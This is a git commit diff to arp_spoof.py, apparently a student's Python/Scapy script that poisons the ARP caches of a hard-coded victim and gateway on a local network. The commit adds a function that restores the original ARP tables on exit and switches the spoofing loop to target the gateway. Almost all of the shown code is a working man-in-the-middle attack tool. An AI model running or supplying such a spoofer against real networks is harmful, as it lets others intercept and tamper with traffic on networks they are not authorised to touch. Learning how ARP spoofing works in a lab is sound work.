ef9b2bcf2f3e425596167fa1ed75ab1f91eae0e8
vatojavier <antonioj.casado@estudiante.uam.es>
2019-02-25 12:08:27 +0100

    reaarp function

--- arp_spoof.py
+++ arp_spoof.py
@@ -17,7 +17,18 @@ def spoof_target(target_ip,target_mac, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip )
     scapy.send(packet, verbose=False)
 
+#reArps the victim and gtw
+def reArp(victim_ip,victim_mac, gateway_ip,gateway_mac):
+    #says victim gtw is at gateway_mac
+    packetV = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac)
+    #says router that victi  is at victim mac
+    packetR = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac)
+    scapy.send(packetV)
+    scapy.send(packetR)
 
+
+
+##      MAIN        ##
 victim_ip = "10.0.0.82"
 gtw_ip    = "10.0.0.1"
 
@@ -26,8 +37,17 @@ gtw_mac    = get_mac(gtw_ip)#get mac of gtw
 print("victim " + victim_ip + " with MAC " + victim_mac)
 print("Router " + gtw_ip + " with MAC " + gtw_mac)
 #spoof them, this way only request for mac once each
-while True:
-    spoof_target(victim_ip,victim_mac,gtw_ip)
-    #spoof_target(gtw_ip,gtw_mac,victim_ip)#spoofing the gw make it wont work!?
-    print("Packets sent")
-    time.sleep(2)
+packets_count = 0
+
+try:
+    while True:
+        #spoof_target(victim_ip,victim_mac,gtw_ip)
+        spoof_target(gtw_ip,gtw_mac,victim_ip)#spoofing the gw make it wont work!?
+        packets_count = packets_count + 1
+        print("\rPackets sent: " + str(packets_count), end="")
+        time.sleep(2)
+
+except KeyboardInterrupt:
+    print("Rearping targets to original table")
+    reArp(victim_ip,victim_mac,gtw_ip,gtw_mac)
+    print("\nClosing spoofer")
